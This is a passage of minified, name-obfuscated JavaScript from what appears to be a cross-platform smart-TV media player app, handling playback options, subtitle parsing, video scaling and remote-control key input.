if(kjtYpr.llII110Ic1wWOIIIlYprQualIndex<0)kjtYpr.llII110Ic1wWOIIIlYprQualIndex=kjtYpr.l0O1011I0MAZWd0100lIYpr.length-1;l1Q0l1I0_1PEOIOIl0Ypr=setTimeout(function(){videoLoad("on");if(Player.Sef){Player.SefPlugin.Execute('Stop');Player.SefPlugin.Execute('ClearScreen');Player.SefPlugin.Close()}else{if(Player.plugin!=null){Player.plugin.Stop();Player.plugin.ClearScreen()}};Player.w=0;Player.h=0;Player.state=Player.STOPPED;Player.play(kjtYpr.l0O1011I0MAZWd0100lIYpr[kjtYpr.llII110Ic1wWOIIIlYprQualIndex][1])},1500);lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"_FPKachestvo_: "+kjtYpr.l0O1011I0MAZWd0100lIYpr[kjtYpr.llII110Ic1wWOIIIlYprQualIndex][0]);break;case "time":kjtYpr.GL.time=parseInt(kjtYpr.GL.time);if(isNaN(kjtYpr.GL.time))kjtYpr.GL.time=0;kjtYpr.GL.time+=x;if(kjtYpr.GL.time<0)kjtYpr.GL.time=1;else if(kjtYpr.GL.time>1)kjtYpr.GL.time=0;lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"_FPDisplay time_: "+shint(kjtYpr.GL.time));kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));break;case "setpw":kjtYpr.GL.Pw=parseInt(kjtYpr.GL.Pw);kjtYpr.GL.Pw+=x;lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"_FPShirina_: "+kjtYpr.GL.Pw+"");chvr=!0;setVideoResolution();kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));break;case "setph":kjtYpr.GL.Ph=parseInt(kjtYpr.GL.Ph);kjtYpr.GL.Ph+=x;lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"_FPVisota_: "+kjtYpr.GL.Ph+"");chvr=!0;setVideoResolution();kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));break;case "setsubtitle":if(lIO1OIOlAQzl1Ol1lYpr=="tizen"){kjtYpr.s_num+=x;if(kjtYpr.s_num<0)kjtYpr.s_num=Player.snum-0;else if(kjtYpr.s_num>Player.snum-0)kjtYpr.s_num=0;if(kjtYpr.s_num==0)webapis.avplay.setSilentSubtitle(!0);else{try{webapis.avplay.setSilentSubtitle(!1);webapis.avplay.setSelectTrack("TEXT",(kjtYpr.s_num+Player.snum_start-1))}catch(e){kjtYpr.popUp("Error: "+e.toString(),2500)}}
lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"_FPSubtitles_ "+kjtYpr.s_num+"/"+Player.snum)}
break;case "setaudio":if(lIO1OIOlAQzl1Ol1lYpr=="tizen"){kjtYpr.a_num+=x;if(kjtYpr.a_num<1)kjtYpr.a_num=Player.tnum-0;else if(kjtYpr.a_num>Player.tnum-0)kjtYpr.a_num=1;if(Player.tnum<2){lI010lp_Z1l1O0Ypr('_FPDrugZvDorNet_!')}else{try{webapis.avplay.setSelectTrack("AUDIO",(kjtYpr.a_num+Player.tnum_start-1))}catch(e){kjtYpr.popUp("Error: "+e.message,2500)}}
lI010lp_Z1l1O0Ypr("_FPZvukDorozhka_ "+kjtYpr.a_num+"/"+Player.tnum);lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"_FPZvukDorozhka_ "+kjtYpr.a_num+"/"+Player.tnum)}
break;case "rezhim":kjtYpr.GL.next=parseInt(kjtYpr.GL.next);if(isNaN(kjtYpr.GL.next))kjtYpr.GL.next=0;kjtYpr.GL.next+=x;if(kjtYpr.GL.next<1)kjtYpr.GL.next=3;else if(kjtYpr.GL.next>3)kjtYpr.GL.next=1;lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,sNext[kjtYpr.GL.next]);kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));break;case "subtitle":sub_sel+=x;if(sub_sel<0)sub_sel=subsrc.length;if(sub_sel>subsrc.length)sub_sel=0;if(sub_sel==0)lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"_FPSubtitles_: _FPOtkl_");else lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"_FPSubtitles_: "+subsrc[sub_sel-1][0]);l1l1lcIal0Q10Ypr();lI010lp_Z1l1O0Ypr(" ");break;case "magvolume":if(uaJ=="mag"){xVol+=x*5;if(xVol>100)xVol=100;if(xVol<0)xVol=0;lI010lp_Z1l1O0Ypr("Громкость: "+xVol);stb.SetVolume(xVol)}
break;case "whitestripes":whitestripes+=x;if(whitestripes<0)whitestripes=0;if(whitestripes<1)lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"_FPAdd stripes_:_FPOtkl._");else lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"_FPAdd stripes_:"+whitestripes+"px");setWhitestripes();break;case "magprop":kjtYpr.GL.xmode=parseInt(kjtYpr.GL.xmode)+x;kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));magpropv(kjtYpr.GL.xmode);lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"_FPProporcii_ _FPvideo_: "+magprop);break;case "lgzvdor":console.log("zv dor change");optLangSel+=x;if(optLangSel>optLang.length-1)optLangSel=0;else if(optLangSel<0)optLangSel=optLang.length-1;media.audioLanguage=optLang[optLangSel];kjtYpr.lll0Il11OxICbl1ll0Ypr("mlang",optLangSel);lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"_FPPredpDor_: "+optLang[optLangSel]);break;case "full":if(lIO1OIOlAQzl1Ol1lYpr=="playerjs"){uplayer[lIO1OIOlAQzl1Ol1lYpr].fullscreen();$_("playerjs").style.width="100%";$_("playerjs").style.height="100%"}else if(lIO1OIOlAQzl1Ol1lYpr=="html5"||lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"){launchFullScreen(video);$_("video").style.width="100%";$_("video").style.height="100%"}else launchFullScreen(media);$_("QualCh").style.display="none";handler="player";break;case "close":$_("QualCh").style.display="none";handler="player";break;case "lgoptions":l0QIllCwu0OO0Ypr();break;case "prophtml5":kjtYpr.GL.xmode=parseInt(kjtYpr.GL.xmode)+x;if(kjtYpr.GL.xmode>4)kjtYpr.GL.xmode=0;else if(kjtYpr.GL.xmode<0)kjtYpr.GL.xmode=4;lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"_FPProporcii_ _FPvideo_ "+kjtYpr.GL.xmode);chvr=!0;setVideoResolution();newOptions();kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));break;case "playerjsvolume":curV+=x*0.1;if(curV>1)curV=1;else if(curV<0)curV=0;if(lIO1OIOlAQzl1Ol1lYpr=="playerjs"){uplayer[lIO1OIOlAQzl1Ol1lYpr].volume(curV);lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"_FPGromkost_ "+Math.ceil(curV*100)+"%")}
break;case "jwstretching":kjtYpr.GL.xmode=parseInt(kjtYpr.GL.xmode)+x;if(kjtYpr.GL.xmode>2)kjtYpr.GL.xmode=0;else if(kjtYpr.GL.xmode<0)kjtYpr.GL.xmode=2;lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"JW _FPEkran_: "+optScreenJW[kjtYpr.GL.xmode]);kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));l0OIQIl1OI0IlI0lIYpr(playUrl,null,getCur());break;case "jwquality":var curA=jwplayer("jw").getCurrentQuality();curA+=x;if(curA>=jwplayer("jw").getQualityLevels().length)curA=0;else if(curA<0)curA=jwplayer("jw").getQualityLevels().length-1;jwplayer("jw").setCurrentQuality(curA);if(curA==0)curA="Auto";lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"JW Quality: "+" ("+curA+"/"+(jwplayer("jw").getQualityLevels().length-1)+")");break;case "jwaudio":var curA=jwplayer("jw").getCurrentAudioTrack();curA+=x;if(curA>=jwplayer("jw").getAudioTracks().length)curA=0;else if(curA<0)curA=jwplayer("jw").getAudioTracks().length-1;jwplayer("jw").setCurrentAudioTrack(curA);if(curA==0)curA="Auto";lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"JW Audio: "+jwplayer("jw").getAudioTracks()[jwplayer("jw").getCurrentAudioTrack()].name+" ("+curA+"/"+(jwplayer("jw").getAudioTracks().length)+")");break;case "jwrate":var curA=jwplayer("jw").getPlaybackRate();curA+=x*0.25;if(curA>4)curA=0.25;else if(curA<0.25)curA=4;jwplayer("jw").setPlaybackRate(curA);lI010lp_Z1l1O0Ypr("Rate: "+curA+"x")
lI1I1IxFCIh1l01llYpr("opText"+kjtYpr.llII110Ic1wWOIIIlYpr,"JW Rate: "+curA+"x");break;default:console.log("out of options switch "+optId[kjtYpr.llII110Ic1wWOIIIlYpr]);if(optId[kjtYpr.llII110Ic1wWOIIIlYpr].indexOf("enterqual")==0){var q=optId[kjtYpr.llII110Ic1wWOIIIlYpr].split("enterqual")[1];if(typeof playElement.json_url=="undefined"){lI010lp_Z1l1O0Ypr("_FPOshibka_ _FPparsingaVideossilki_!");return}
var url=playElement.json_url[q].url;playElement.json_select=q;if(gV(playElement.json_url[q],"audio").indexOf("http")==0)url+="#AUDIO="+playElement.json_url[q].audio;lI010lp_Z1l1O0Ypr("Play "+q+"p");if(playUrlAudio!=""&&sound!=null){sound.pause();sound.src=""}
l0OIQIl1OI0IlI0lIYpr(streamnum(url),null,getCur());$_("QualCh").style.display="none";handler="player"}
break}}catch(e){console.log(e)}}
function l1Il1I1l0bMllOlQOOYpr(id,text,click,x){console.log(img_dir+"/turn_left.png  FILE");optId[id]=x;if(fhd)innerH=1080;var s="<div style='width: 100%;height: "+css_wh(43)+"px; overflow:hidden;' onmousemove=\"kjtYpr.llII110Ic1wWOIIIlYpr="+id+";l000IlIOlu1l1I1llQlYpr();\" id='ql1II1IlOORHvj11O1Ypr"+id+"'><div onclick=\"llIO1llNDl0IIlYpr(-1);\" style='float:left;'><img width='"+css_w(40)+"' src='"+_img("_ST_turn_left.png")+"' ></div><div onclick=\"llIO1llNDl0IIlYpr(1);\" style='float:right;'><img width='"+css_w(40)+"' src='"+_img("_ST_turn_right.png")+"' ></div><div onclick=\"if("+click+"==true) llIO1llNDl0IIlYpr(0);\"  id='opText"+id+"' style='font-size:"+css_wh(27)+"px;padding-top:3px;width:auto;overflow:hidden;word-break: break-all;text-align:center;height:"+css_wh(32)+"px;'>"+text+"</div></div>";if(fhd)innerH=720;return s}
function launchFullScreen(element){console.log("launchFullScreen");if(element.requestFullScreen){element.requestFullScreen()}else if(element.mozRequestFullScreen){element.mozRequestFullScreen()}else if(element.webkitRequestFullScreen){element.webkitRequestFullScreen()}}
function l0QIllCwu0OO0Ypr(){console.log("open options");if(window.NetCastLaunchQMENU){window.NetCastLaunchQMENU()}}
function checkFileExtensions(url){return!0;for(var i=0;i<supportedMimeTypes.length;i++){if(url.lastIndexOf(supportedMimeTypes[i])>0){currentType=url.slice(url.indexOf(".")+1,url.length);return!0}}
return!1};var infPltimer=null;function lI010lp_Z1l1O0Ypr(text){if(text==null)text="";clearTimeout(infPltimer);clearTimeout(inftimer);if(subsrc.length>0){if(sub_sel==0)text+=" _FPSubtitles_: _FPOtkl_ ("+subsrc.length+")";else text+=" _FPSubtitles_: "+subsrc[sub_sel-1][0]}
console.log(text);lI1I1IxFCIh1l01llYpr("infPl",text);if($_("playerBottom").style.display=="none"&&$_("loading").style.display=="none"){inftimer=setTimeout('$_("player_time").style.display="block";$_("pstream").style.display="none";lI1I1IxFCIh1l01llYpr("infPl","");',1500);$_("player").style.display=="block";$_("playerBottom").style.display="none";$_("buttonTop").style.display="none";$_("recovery").style.display="none";$_("ptt").style.display="none";$_("pstream").style.display="block";$_("player_time").style.display="none";try{$_("ico_p").style.display="none"}catch(e){}
try{$_("info_num").style.display="none"}catch(e){}
try{$_("infR").style.display="none"}catch(e){}
try{$_("epg_player").style.display="none";$_("epg_player").style.height="85px"}catch(e){}
triggerHide(4000)}};var chvr=!0;function setVideoResolution(){console.log("setVideoResolution");if(kjtYpr.GL.xmode<1||!chvr||(platform=="android-device"&&lIO1OIOlAQzl1Ol1lYpr=="media"))return;if(lIO1OIOlAQzl1Ol1lYpr!="html5"&&lIO1OIOlAQzl1Ol1lYpr!="ifrhtml5"){return}
lI010lp_Z1l1O0Ypr("_FPProporcii_: "+kjtYpr.GL.xmode);var xWidth=0;var videoRatio=video.videoWidth/video.videoHeight,tagRatio=16/9;if(kjtYpr.GL.xmode==4){kjtYpr.GL.Pw=parseFloat(kjtYpr.GL.Pw);kjtYpr.GL.Ph=parseFloat(kjtYpr.GL.Ph);if(kjtYpr.GL.Pw<200)kjtYpr.GL.Pw=1280;if(kjtYpr.GL.Ph<200)kjtYpr.GL.Ph=720;tagRatio=parseInt(kjtYpr.GL.Pw)/parseInt(kjtYpr.GL.Ph);console.log("setVideoResolution"+tagRatio);video.style.top="0px";video.style.left="0px";video.style.width=kjtYpr.GL.Pw+"px";video.style.height=kjtYpr.GL.Ph+"px";if(videoRatio<tagRatio){video.style.WebkitTransform="scaleX("+tagRatio/videoRatio+")"}else{video.style.WebkitTransform="scaleY("+videoRatio/tagRatio+")"}
lI010lp_Z1l1O0Ypr("_FPProporcii_: "+kjtYpr.GL.xmode+" "+kjtYpr.GL.Pw+"x"+kjtYpr.GL.Ph)}else if(kjtYpr.GL.xmode<=1){if(videoRatio>=tagRatio-0.01){video.style.width=window.innerWidth+"px";video.style.height=window.innerHeight+"px";video.style.top="0px";video.style.left="0px";video.style.WebkitTransform="scaleY(1)"}else{video.style.width=window.innerWidth+16+"px";video.style.height=window.innerHeight+9+"px";video.style.top="-6px";video.style.left="-8px";tagRatio=4/3;if(videoRatio<tagRatio){video.style.WebkitTransform="scaleX("+tagRatio/videoRatio+")"}else{video.style.WebkitTransform="scaleY("+videoRatio/tagRatio+")"}}}else if(kjtYpr.GL.xmode==2){if(videoRatio<tagRatio){video.style.WebkitTransform="scaleX("+tagRatio/videoRatio+")"}else{video.style.WebkitTransform="scaleY("+videoRatio/tagRatio+")"}
video.style.width=window.innerWidth+16+"px";video.style.height=window.innerHeight+9+"px";video.style.top="-6px";video.style.left="-8px"}else{tagRatio=4/3;if(videoRatio<tagRatio){video.style.WebkitTransform="scaleX("+tagRatio/videoRatio+")"}else{video.style.WebkitTransform="scaleY("+videoRatio/tagRatio+")"}
video.style.width=xWidth?"2576px":"1728px";video.style.height=xWidth?"1449px":"976px";video.style.top=xWidth?"-186px":"-128px";video.style.left=xWidth?"-328px":"-224px"}
if(kjtYpr.GL.xmode<=1){video.style.width=window.innerWidth+"px";video.style.height=window.innerHeight+"px";video.style.top="0px";video.style.left="0px"}
chvr=!1}
function trim2(str){while(str.charAt(str.length-1)==" "){str=str.slice(0,str.length-1)}
while(str.charAt(0)==" "){str=str.slice(1,str.length)}
return str}
function show_desc(mode){if(mode){$_("site").style.display="block";$_("top").style.display="block";$_("inset").style.display="block";$_("top2").style.display="block";$_("bottom").style.display="block"}else{$_("site").style.display="none";$_("top").style.display="none";$_("inset").style.display="none";$_("top2").style.display="none";$_("bottom").style.display="none"}}
var subsrc=[],sub_sel=0;function lIIl0Il0LaVOO0OIYpr(){sub_sel=0;audioTrackHtml5=0;curV=1;$_("prekinfo").style.display="none";$_("arrowtime").style.display="none";Player.cur_time=-1;Player.total_time=-1;curTime=-1;totalTime=-1;if(playUrlAudio!="")lI1I1IxFCIh1l01llYpr("other","");playUrlAudio="";is_rek=!1;clearTimeout(advTimer);if(!norek){}
norek=!1;kjtYpr.l1l0OIlxII1l1IIYpr=0,curTime=0,totalTime=0,si=0;kjtYpr.llII110Ic1wWOIIIlYpr=0;kjtYpr.llII110Ic1wWOIIIlYprQualIndex=0;lastViewUrlGo=!1;arc_fwd=0;arc_timestamp=0;cntIndex=1;chvr=!0}
function videosub_timecode_min(tc){try{tcpair=tc.split(' --> ');return lOllO11DxVmeOl1QYpr(tcpair[0])}catch(e){return 0}}
function videosub_timecode_max(tc){try{tcpair=tc.split(' --> ');return lOllO11DxVmeOl1QYpr(tcpair[1])}catch(e){return 1}}
function lOllO11DxVmeOl1QYpr(tc){tc1=tc.split(',');tc2=tc1[0].split(':');if(tc2.length==2)tc2.unshift(0);secs=Math.floor(tc2[0]*60*60)+Math.floor(tc2[1]*60)+Math.floor(tc2[2]);return secs}
function splitHls(xmlDoc,proxy){var regexp=new RegExp("(https?://.*)","ig");var n=0,s="";var U=[];console.log("splitHls");while((x=regexp.exec(xmlDoc))!=null){console.log(x[1]);U.push(x[1])}
function getU(u){var xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status==200){s+=xhr.responseText;n++;if(n<U.length)getU(U[n]);else{parseVtt(s)}}else{if(proxy==null){return splitHls(xmlDoc,!0)}}}};xhr.open('GET',u,!0);xhr.send()}
getU(U[n])}
var el={"subtitles":[]},timerSub,moveSub=1;function parseVtt(xmlDoc){el.subtitles=[];console.log(el.subtitles);records=xmlDoc.replace(/\r/g,"").split('\n\n');console.log(records);for(var r=0;r<records.length;r++){if(records[r].indexOf("-->")==-1)continue;record=records[r].split('\n');if(record[0].indexOf("-->")>0){record.unshift("");el.subtitles.push(record)}else{el.subtitles.push(record)}}
l0IOlIO00JlIIOlOYpr()}
function l1l1lcIal0Q10Ypr(){var subtitlesrc='';clearInterval(timerSub);if(subsrc.length>0&&sub_sel>0){$_("subtitle").style.display="block";subtitlesrc=subsrc[sub_sel-1][1]}else{$_("subtitle").style.display="none";return}
if(typeof subsrc[sub_sel-1][3]!="undefined")moveSub=subsrc[sub_sel-1][3];else moveSub=1;if(subtitlesrc.indexOf("md5hash")&&subsrc[sub_sel-1][2]!=null&&subsrc[sub_sel-1][2]!=""){var xhr2=new XMLHttpRequest();xhr2.onreadystatechange=function(){if(xhr2.readyState==4){if(xhr2.status==200){subsrc[sub_sel-1][2]=null;subsrc[sub_sel-1][1]=subsrc[sub_sel-1][1].replace("md5hash",xhr2.responseText);console.log(subsrc);l1l1lcIal0Q10Ypr()}else{sub_sel=0;$_("subtitle").style.display="none";lI010lp_Z1l1O0Ypr("");kjtYpr.popUp("Error download/parse subtitles<br>"+xhr2.status,2000)}}};xhr2.open('GET',subsrc[sub_sel-1][2],!0);xhr2.send();return}
if(subtitlesrc.indexOf("LOCAL_IP")>0)subtitlesrc=subtitlesrc.replace("LOCAL_IP",kjtYpr.GL.remoteip.split(":")[0]);timerSub=setInterval("l0OIl1IOlfYllOQOYpr();",320);try{var xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status==200){xmlDoc=xhr.responseText;if(xmlDoc.indexOf("#EXTM3U")>=0){return splitHls(xmlDoc)}
parseVtt(xmlDoc)}else{if(subtitlesrc.indexOf("/xhr.php")==-1){subsrc[sub_sel-1][1]="http://195.88.208.101/xhr.php?u="+encodeURIComponent(subsrc[sub_sel-1][1]);l1l1lcIal0Q10Ypr();return}
sub_sel=0;$_("subtitle").style.display="none";lI010lp_Z1l1O0Ypr("");kjtYpr.popUp("Error download subtitles<br>"+xhr.status,2000)}}};xhr.open('GET',subtitlesrc,!0);xhr.send()}catch(e){sub_sel=0;$_("subtitle").style.display="none";lI010lp_Z1l1O0Ypr("");kjtYpr.popUp("Error download subtitles<br>"+e.message,2000)}
el.subcount=0;if(lIO1OIOlAQzl1Ol1lYpr=="html5"||lIO1OIOlAQzl1Ol1lYpr=="ifrhtml5"){video.addEventListener('seek',l0IOlIO00JlIIOlOYpr)}}
function l0IOlIO00JlIIOlOYpr(){if($_("subtitle").style.display=="none")return;console.log(el);el.subcount=0;curTime=getCur()*moveSub;while(videosub_timecode_max(el.subtitles[el.subcount][1])<curTime.toFixed(1)){el.subcount++;if(el.subcount>el.subtitles.length-1){el.subcount=el.subtitles.length-1;break}}
console.log("l0IOlIO00JlIIOlOYpr"+el.subcount)}
function l0OIl1IOlfYllOQOYpr(){try{if($_("subtitle").style.display=="none"){clearInterval(timerSub);return}
curTime=getCur()*moveSub;var subtitle='';if(curTime.toFixed(1)>=videosub_timecode_min(el.subtitles[el.subcount][1])&&curTime.toFixed(1)<=videosub_timecode_max(el.subtitles[el.subcount][1])){subtitle=el.subtitles[el.subcount][2];if(typeof el.subtitles[el.subcount][3]!="undefined")subtitle+="<br>"+el.subtitles[el.subcount][3];console.log(el.subtitles[el.subcount])}
if(curTime.toFixed(1)>videosub_timecode_max(el.subtitles[el.subcount][1])&&el.subcount<(el.subtitles.length-1)){el.subcount++}
lI1I1IxFCIh1l01llYpr("subtitle",subtitle)}catch(e){lI1I1IxFCIh1l01llYpr("subtitle","")}}
var buff={scrollsite:0,ch:{},cleartop:function(){console.log("cleartop");this.scrollsite=null;this.ch={}},chtop:function(n){var c=this;if(typeof c.ch[n]=="undefined"){c.ch[n]=$_("ch"+n).offsetTop}
return c.ch[n]},scrollsitetop:function(n){if(this.scrollsite==null)this.scrollsite=$_("scrollsite").scrollTop;if(n!=null){$_("scrollsite").scrollTop=n;this.scrollsite=$_("scrollsite").scrollTop}
return this.scrollsite}};var scrhint=[1,"This is a cross-platform application for displaying custom multimedia pages. It does not contain any content and is a so-called White Label application.","View pages in JSON (JavaScript Object Notation), XML, or M3U format from any CORS-enabled HTTP server","You can create your own content or open existing and shared content from other people."];var scrhintru=[1,"Перед вами кроссплатформенное приложение для отбражения настраиваемых мультимедийных страниц. Он не содержит никакого контента и представляет собой так называемое приложение White Label.","Просматривайте страницы в формате JSON (JavaScript Object Notation), XML или M3U с любого HTTP-сервера, поддерживающого CORS","Вы можете создать свой собственный контент или открывать существующий и общий контент от других людей."];function screensaver(m){if(m&&kjtYpr.GL.scrsaver>0){if(parseInt(kjtYpr.GL.scrsaver)==1){screensaver_mod(1);var pos1=["bottom","top"][_.random(0,1)];var pos2=["left","right"][_.random(0,1)];lI1I1IxFCIh1l01llYpr("scrsaver","<div id='scrdiv' style='margin:10px;position: absolute; "+pos1+": 0px; "+pos2+": 0px;width:30%;height:20%;'>"+scrhint[scrhint[0]]+"</div>");setTimeout(function(){if($_("scrdiv")!=null){if(++scrhint[0]>scrhint.length-1)scrhint[0]=1;screensaver(m)}},12000)}
if(parseInt(kjtYpr.GL.scrsaver)==2){screensaver_mod(1)}}}
function screensaver_mod(m){if(m==1){isScreensaver=!0;$_("scrsaver").style.width="100%";$_("scrsaver").style.height="100%";$_("scrsaver").style.display="block";$_("scrsaver").style.zIndex="3"}else if(m==0){isScreensaver=!1;$_("scrsaver").style.width="0px";$_("scrsaver").style.height="0px";$_("scrsaver").style.display="none";$_("scrsaver").style.zIndex="-1";lI1I1IxFCIh1l01llYpr("scrsaver","")}}
function keyAndr(e){e=e||event;var key=e.keyCode||e.keycode||e.which;console.log("keyAndr ");console.log(e);if(handler!="vk"||key==VK_DOWN||key==VK_UP){e.preventDefault();return!1}}
if(hashR){window.addEventListener("popstate",function(n){console.log(n);console.log(document.location.hash);if(nkh<3&&(document.location.hash!="#"+numBack2||document.location.hash=="#"+numBack)){console.log("!="+numBack2);keyHandler({"keycode":VK_BACK});sethash()}},!1)}
var backCounter=0;function sethash(n){if(hashR){backCounter++;numBack=numBack2;var h=document.location.hash.replace("#","").split(";");if(h.length==1)h[0]="";if(n==null)n=getInfoUrl();if(n==null)n=h[0];else{n=n.replace(/[^a-zA-Z0-9:\/_\.=\?\-\&]/g,"")}
n+=";"+backCounter;numBack2=n;console.log("set hash "+numBack2);document.location.hash=numBack2}}
var nkh=0,brs=0,tTimer=null,rrT=null,rrK=null,start1=0,kth=0;function keyHandler(e){event=e||event;start1=new Date().getTime();console.log(event);key=event.keyCode||event.keycode||event.which;if(hashR&&key==VK_BACK){if(++nkh>3){kjtYpr.popUp("Error hash back button!",2000);console.log("hashr ret");return}}
if(key==463)key=VK_PAUSE;if(key==10009)key=VK_BACK;if(handler=="vk"&&kjtYpr.GL.keyboard=="system"&&!VK.focus.getAttribute("readonly")&&kjtYpr.build<7&&key!=VK_BACK){return!0}
$_("main").focus();if(isScreensaver){screensaver_mod(0);return}
screensavertimer=-1;clearTimeout(tTimer);if(handler=="confirm"&&$_("l1IOI0lu11lO1IYpr")==null)handler="menu";if(handler=="iframe"){console.log("iframe");return;if(key==VK_BLUE){if(iframeExit)document.location.reload();iframeExit++}else iframeExit=0}
if(platform=="android-device"){try{okey=String(key);console.log("ACT="+okey);var nn=0;for(var x in event)nn++;if(handler=="menu"&&okey.indexOf("/")==-1&&nn==1&&(key==VK_DOWN||key==VK_UP)){console.log("propusk key");return}else if(okey.match(/_del/i))key=VK_BACK;else if(okey.match(/red/i))key=VK_RED;else if(okey.match(/green/i))key=VK_GREEN;else if(okey.match(/blue/i))key=VK_BLUE;else if(okey.match(/yellow/i))key=VK_YELLOW;else if(okey.match(/info/i))key=VK_INFO;else if(okey.match(/F5/))key=VK_RED;else if(okey.match(/F6/))key=VK_GREEN;else if(okey.match(/F7/))key=VK_YELLOW;else if(okey.match(/F8/))key=VK_BLUE;else if(okey.match(/menu/i)){if(ttmac&&handler=="menu"){if(curCh()["playlist_url"].indexOf("?list=")>0){var k=curCh()["playlist_url"].split("?list=")[1];lI1I1IxFCIh1l01llYpr("infoList",unescape(k))}else lI1I1IxFCIh1l01llYpr("infoList",curCh()["playlist_url"]+curCh("stream_url"))}
key=VK_RED}else if(okey.match(/center/i))key=VK_ENTER;else if(okey.match(/(channeldown|previous)/i))key=VK_PAGE_DOWN;else if(okey.match(/(channelup|next)/i))key=VK_PAGE_UP;else if(okey.match(/pause/i))key=VK_PAUSE;else if(okey.match(/mediaplay/i))key=VK_PLAY;else if(okey.match(/stop/i))key=VK_STOP;else if(okey.match(/rewind/i))key=VK_REWIND;else if(okey.match(/forward/i))key=VK_FAST_FWD;else if(okey.match(/left/i))key=VK_LEFT;else if(okey.match(/up/i))key=VK_UP;else if(okey.match(/right/i))key=VK_RIGHT;else if(okey.match(/down/i))key=VK_DOWN;else if(okey.match(/(enter|inter)/i))key=VK_ENTER;else{var kk=key.split("/");k1=parseInt(kk[0]);k2=parseInt(kk[1]);if(isNaN(k1))k1=0;if(isNaN(k2))k2=0;if(k1>k2)key=k1;else if(k2>k1)key=k1;if(key==82)key=VK_RED}}catch(e){}}
if(key==8&&platform!="sams")key=VK_BACK;if(booting){if(((key==VK_RED||key==VK_A))||(platform=="sams"&&key==tvKey.KEY_TOOLS)){if(brs++)sbrosok(!0);return}}
if(!gV(event,"repeat")){if(key==rrK){console.log("double miss click");rrK=null;return}else{rrK=key;setTimeout("rrK=null;",40)}}
if(platform=="sams"){if(key==VK_BACK||key==VK_EXIT){if(kjtYpr.Exittrue<2){widgetAPI.blockNavigation(event);console.log("blockNavigation")}}else if(key==tvKey.KEY_PANEL_VOL_UP||key==tvKey.KEY_VOL_UP){plaginAudio.SetVolumeWithKey(0);return}else if(key==tvKey.KEY_VOL_DOWN||key==tvKey.KEY_PANEL_VOL_DOWN){plaginAudio.SetVolumeWithKey(1);return}else if(key==tvKey.KEY_MUTE){Player.isMuted=!Player.isMuted;pluginAudio.SetUserMute(Player.isMuted?1:0);return}}else if(platform!="android-device"&&event.stopPropagation){try{event.stopPropagation();event.preventDefault();event.stopImmediatePropagation()}catch(e){}}
if(uaJ=="mag"){if(key==KEY_VOLUME_PLUS){xVol+=5;if(xVol>100)xVol=100;stb.SetVolume(xVol);lI010lp_Z1l1O0Ypr("Громкость: "+xVol)}
if(key==KEY_VOLUME_MINUS){xVol-=5;if(xVol<0)xVol=0;stb.SetVolume(xVol);lI010lp_Z1l1O0Ypr("Громкость: "+xVol)}
if(key>30)kjtYpr.Exittrue=0}else if(key!=VK_EXIT)kjtYpr.Exittrue=0;if(uaJ=="sony"){if(key==112)key=VK_BLUE;else if(key==113)key=VK_RED;else if(key==114)key=VK_GREEN;else if(key==115)key=VK_YELLOW;else if(key==457)key=VK_INFO}
if($_("hint")!=null){$("#hint").remove();console.log("hint remove");return}
if(handler!="confirm"&&handler!="vk"&&tscreen=="game"&&(key==VK_BACK||key==VK_ENTER||key==VK_DOWN||key==VK_UP)){if(key==VK_BACK){if(!tomflight_f)tomflight_fail();else{tscreen="main";$_("game").style.display="none";$_("game").style.zIndex="0"}}
if(key==VK_UP){tomflight_click()}else if(key==VK_DOWN){tomflight_down()}else{tomflight_click()}
return}
if(handler=="confirm"&&$_("vk").style.display=="block")handler="vk";switch(parseInt(kjtYpr.GL["return"])){case 1:if(key==VK_RED||key==VK_A)key=VK_BACK;break;case 2:if(key==VK_GREEN)key=VK_BACK;break;case 3:if(key==VK_YELLOW)key=VK_BACK;break;case 4:if(key==VK_BLUE)key=VK_BACK;break;case 5:if(key==VK_LEFT){if(handler=="menu"&&select>=0&&!ll0l0loMtIlIOYpr())key=VK_BACK}
break}
